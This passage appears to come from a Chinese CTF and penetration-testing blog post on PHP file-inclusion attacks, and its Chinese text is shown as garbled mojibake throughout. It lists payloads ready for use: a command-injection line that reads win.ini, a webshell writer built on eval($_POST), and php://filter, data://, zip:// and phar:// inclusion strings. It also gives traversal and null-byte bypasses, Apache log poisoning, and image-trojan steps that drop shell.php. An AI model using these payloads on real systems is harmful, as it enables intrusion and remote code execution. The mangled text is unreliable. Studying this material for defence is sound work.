<li><strong>&amp;&amp;</strong>ï¼šå‰é¢å‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</li>
<li>åœ¨Linuxä¸­è¿˜å¯ä»¥ç”¨ï¼›å·æ¥è¿æ¥ã€‚</li>
</ul>
<h3 id="å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°</h3><ul>
<li><p>systemï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œï¼Œå¦åˆ™è¿”å›FALSE</p>
</li>
<li><p>execï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œ</p>
</li>
<li><p>shell_execï¼šæˆåŠŸæ‰§è¡Œè¿”å›å…¨éƒ¨ç»“æœï¼Œå¦åˆ™è¿”å›NULL</p>
</li>
<li><p>passthru ï¼šæŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·åœ°ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</p>
</li>
</ul>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><strong>è¯»å–æŒ‡å®šç›®å½•å†…å®¹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...|dir C:\user</span><br></pre></td></tr></table></figure>
<p><strong>è¯»å–æŒ‡å®šæ–‡ä»¶å†…å®¹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8|type C:\windows\win.ini</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="0x05phpä¼ªåè®®"><a href="#0x05phpä¼ªåè®®" class="headerlink" title="0x05phpä¼ªåè®®"></a>0x05phpä¼ªåè®®</h2><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input:<strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚</strong>å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>åœ¨ctfä¸­ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p>
<p>é€šå¸¸ä¼šæœ‰ä¸¤ç§ç±»å‹ï¼š</p>
<ol>
<li>ä»»æ„ä»£ç æ‰§è¡Œ</li>
<li>æ–‡ä»¶å†…å®¹ç»•è¿‡</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(â€œshell.phpâ€,â€wâ€),â€™&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;â€™);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><strong>php://filter</strong>å¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><strong>zip://</strong> å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line">zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class="line"></span><br><span class="line">å…ˆå°†è¦æ‰§è¡Œçš„PHPä»£ç å†™å¥½æ–‡ä»¶åä¸ºphpcode.txtï¼Œå°†phpcode.txtè¿›è¡Œzipå‹ç¼©,å‹ç¼©æ–‡ä»¶åä¸ºfile.zip,å¦‚æœå¯ä»¥ä¸Šä¼ zipæ–‡ä»¶ä¾¿ç›´æ¥ä¸Šä¼ ï¼Œè‹¥ä¸èƒ½ä¾¿å°†file.zipé‡å‘½åä¸ºfile.jpgååœ¨ä¸Šä¼ ï¼Œå…¶ä»–å‡ ç§å‹ç¼©æ ¼å¼ä¹Ÿå¯ä»¥è¿™æ ·æ“ä½œã€‚</span><br><span class="line"></span><br><span class="line">ç”±äº#åœ¨getè¯·æ±‚ä¸­ä¼šå°†åé¢çš„å‚æ•°å¿½ç•¥æ‰€ä»¥ä½¿ç”¨getè¯·æ±‚æ—¶å€™åº”è¿›è¡Œurlç¼–ç ä¸º%23ï¼Œä¸”æ­¤å¤„ç»è¿‡æµ‹è¯•ç›¸å¯¹è·¯å¾„æ˜¯ä¸å¯è¡Œï¼Œæ‰€ä»¥åªèƒ½ç”¨ç»å¯¹è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="data-å’Œphar"><a href="#data-å’Œphar" class="headerlink" title="data://å’Œphar://"></a>data://å’Œphar://</h3><p><strong>data://</strong> åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
<p><strong>phar://</strong> æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:\zip.jpg\cmd.php</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png" alt="image-20200803154243815"></p>
<h2 id="0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"><a href="#0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶" class="headerlink" title="0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"></a>0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶</h2><p>WEBæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨è®¿é—®æ—¥å¿—ä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®æ—¥å¿—è®°å½•çš„å†…å®¹ï¼Œç²¾å¿ƒæ„é€ è¯·æ±‚ï¼ŒæŠŠPHPä»£ç æ’å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œæ—¥å¿—ä¸­çš„PHPä»£ç ã€‚</p>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
<li>å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»</li>
<li>çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â€ƒApacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line">â€ƒâ€ƒå¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ&lt;?php phpinfo(); ?&gt; å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure>
<h2 id="0x07åŒ…å«SESSION"><a href="#0x07åŒ…å«SESSION" class="headerlink" title="0x07åŒ…å«SESSION"></a>0x07åŒ…å«SESSION</h2><p>å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚</p>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ol>
<li>æ‰¾åˆ°SESSIONå†…çš„å¯æ§å˜é‡</li>
<li>SESSIONæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„</li>
</ol>
<p>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p>
<h2 id="0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶</h2><p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\winsdows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p>
<p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p>
<h2 id="0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶"><a href="#0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶"></a>0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶</h2><p>å¾ˆå¤šç½‘ç«™é€šå¸¸ä¼šæä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šä¸Šä¼ å¤´åƒã€æ–‡æ¡£ç­‰ï¼Œè¿™æ—¶å°±å¯ä»¥é‡‡å–ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬çš„æ–¹å¼è¿›è¡ŒåŒ…å«ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å›¾ç‰‡é©¬çš„åˆ¶ä½œæ–¹å¼å¦‚ä¸‹ï¼Œåœ¨cmdæ§åˆ¶å°ä¸‹è¾“å…¥ï¼š</span><br><span class="line"></span><br><span class="line">è¿›å…¥1.jpgå’Œ2.phpçš„æ–‡ä»¶ç›®å½•åï¼Œæ‰§è¡Œï¼š</span><br><span class="line"></span><br><span class="line">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">å°†å›¾ç‰‡1.jpgå’ŒåŒ…å«phpä»£ç çš„2.phpæ–‡ä»¶åˆå¹¶ç”Ÿæˆå›¾ç‰‡é©¬3.jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å‡è®¾å·²ç»ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œè·¯å¾„ä¸º&#x2F;upload&#x2F;201811.jpg</span><br><span class="line">å›¾ç‰‡ä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">ç„¶åè®¿é—®URLï¼šhttp:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpgï¼ŒåŒ…å«è¿™å¼ å›¾ç‰‡ï¼Œå°†ä¼šåœ¨index.phpæ‰€åœ¨çš„ç›®å½•ä¸‹ç”Ÿæˆshell.php</span><br></pre></td></tr></table></figure>
<h1 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h1><h2 id="0x10æŒ‡å®šå‰ç¼€ç»•è¿‡"><a href="#0x10æŒ‡å®šå‰ç¼€ç»•è¿‡" class="headerlink" title="0x10æŒ‡å®šå‰ç¼€ç»•è¿‡"></a>0x10æŒ‡å®šå‰ç¼€ç»•è¿‡</h2><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>ä½¿ç”¨../../è¿”å›ä¸Šä¸€ç›®å½•ï¼Œç§°ä¸ºç›®å½•éå†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//å‰ç¼€</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ol>
<li><p>urlç¼–ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br></pre></td></tr></table></figure>
</li>
<li><p>äºŒæ¬¡ç¼–ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%252e%252e%252f</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®¹å™¨/æœåŠ¡å™¨ç¼–ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">..%c0%af</span><br><span class="line">%c0%ae%c0%ae&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">..%c1%9c</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="0x11æŒ‡å®šåç¼€ç»•è¿‡"><a href="#0x11æŒ‡å®šåç¼€ç»•è¿‡" class="headerlink" title="0x11æŒ‡å®šåç¼€ç»•è¿‡"></a>0x11æŒ‡å®šåç¼€ç»•è¿‡</h2><p>åç¼€æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//åç¼€</span></span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ©ç”¨url"><a href="#åˆ©ç”¨url" class="headerlink" title="åˆ©ç”¨url"></a>åˆ©ç”¨url</h3><p>å®Œæ•´urlæ ¼å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>
<p><strong>query(?)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure>
<p><strong>fragment(#)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure>
<h3 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h3><p><strong>zip://</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo.txt</span><br></pre></td></tr></table></figure>
<p><strong>phar://</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
<h3 id="é•¿åº¦æˆªæ–­"><a href="#é•¿åº¦æˆªæ–­" class="headerlink" title="é•¿åº¦æˆªæ–­"></a>é•¿åº¦æˆªæ–­</h3><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>
<ul>
<li>phpç‰ˆæœ¬ &lt; php 5.2.8</li>
</ul>
<p><strong>åŸç†ï¼š</strong></p>
<ul>
<li>Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒ</li>
<li>Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚</li>
</ul>
<p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p>
<ul>
<li><p>åªéœ€è¦ä¸æ–­çš„é‡å¤ ./(Windowsç³»ç»Ÿä¸‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ . æˆªæ–­)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;ã€‚ã€‚ã€‚çœç•¥ã€‚ã€‚ã€‚.&#x2F;.&#x2F;shell.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>åˆ™æŒ‡å®šçš„åç¼€.txtä¼šåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰</p>
<h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>
<ul>
<li>magic_quotes_gpc = Off</li>
<li>phpç‰ˆæœ¬ &lt; php 5.3.4</li>
</ul>
<p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p>
<ul>
<li><p>ç›´æ¥åœ¨æ–‡ä»¶åçš„æœ€ååŠ ä¸Š%00æ¥æˆªæ–­æŒ‡å®šçš„åç¼€å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  ?file&#x3D;shell.php%00</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>æ³¨ï¼šç°åœ¨ç”¨åˆ°%00é˜¶æ®µçš„æƒ…å†µå·²ç»ä¸å¤šäº†</p>
<h2 id="0x12é€šè¿‡phpinfoå»Getshell"><a href="#0x12é€šè¿‡phpinfoå»Getshell" class="headerlink" title="0x12é€šè¿‡phpinfoå»Getshell"></a>0x12é€šè¿‡phpinfoå»Getshell</h2><p><a href="https://cloud.tencent.com/developer/article/1609810" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1609810</a></p>
<p>phpinfoæ–‡ä»¶æ³„éœ²ä¸€ç›´è¢«å¤§å®¶æ‰€å¿½è§†ï¼Œä½†å…¶å®phpinfoå¯ä»¥ä¸ºæ”»å‡»æ¸—é€æµ‹è¯•äººå‘˜æä¾›å¾ˆå¤šçš„ä¿¡æ¯ã€‚</p>
<p>1.system</p>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png" alt="image-20200928215927019"></p>
<p>æä¾›æœåŠ¡å™¨æ‰€åœ¨çš„æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ã€‚</p>
<p>2.çœŸå®ip</p>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png" alt="image-20200928215935664"></p>
<p>çŸ¥é“çœŸå®ipçš„æˆ‘ä»¬å¯ä»¥çœå»cdnå¸¦æ¥çš„å„ç§å›°æ‰°ã€‚æˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥ç«¯å£æ—ç«™ä¸€é¡¿æ“ä½œã€‚</p>
<p> 3.webæ ¹ç›®å½•</p>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png" alt="image-20200928215944121"></p>
<p>ç½‘ç«™ç»å¯¹è·¯å¾„å¯¹æ¸—é€æµ‹è¯•ç›¸å½“çš„æœ‰ç”¨ï¼Œå½“ä½ æ‰¾åˆ°SQLæ³¨å…¥ç‚¹æ—¶ï¼Œè¦ä¸Šä¼ æœ¨é©¬çš„æ—¶å€™å°±éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„æ‰å¯ä»¥è·å–webshellã€‚å‡å¦‚è¯¥ç½‘ç«™ä½¿ç”¨çš„æ˜¯å¦‚xamppä¹‹ç±»çš„å¿«é€Ÿæ­å»ºçš„è½¯ä»¶ï¼Œä½ ä¾¿å¯ä»¥å¯»æ‰¾è¯¥è½¯ä»¶å¯¹åº”çš„æ¼æ´å»å°è¯•æ”»å‡»ç›®æ ‡ç½‘ç«™ã€‚</p>
<ol>
<li>disable_functions</li>
</ol>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png" alt="image-20200928215953280"></p>
<p>é€šè¿‡disable_functionsä½ å¯ä»¥äº†è§£åˆ°è¯¥ç½‘ç«™ç¦ç”¨äº†äº›ä»€ä¹ˆå‡½æ•°ï¼Œç„¶åå»ç»•è¿‡ä»£ç æ‰§è¡Œå’Œç¼–å†™webshellæ—¶é‡åˆ°çš„é—®é¢˜ã€‚</p>
<ol>
<li>ä¸´æ—¶æ–‡ä»¶è·¯å¾„</li>
<li><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png" alt="image-20200928220004673"></li>
</ol>
